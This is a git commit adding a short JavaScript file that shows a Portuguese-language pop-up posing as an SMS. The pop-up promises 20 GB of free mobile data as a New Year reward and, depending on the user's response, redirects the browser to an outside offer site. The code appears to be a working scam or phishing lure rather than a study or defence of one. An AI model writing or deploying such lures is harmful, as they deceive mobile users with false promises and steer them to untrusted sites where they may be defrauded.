a7402f1fde7156f4b43c07d5e71f47a4433566e7
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-09 13:59:46 -0800

    Create orange20go-dados.js

---
+++ orange20go-dados.js
@@ -0,0 +1,5 @@
+var password = '20 GB de dados gratuitos'
+password=prompt('SMS: Parabéns, seu número é elegível para receber 20 GB de dados gratuitos. RECOMPENSA DE Ano Novo, por favor pressione OK para ATIVAR. ','20 GB de dados gratuitos');
+if (password != '20 GB de dados gratuitos') {
+location.href='https://offerforall.info/orange20go-dados.html';
+}
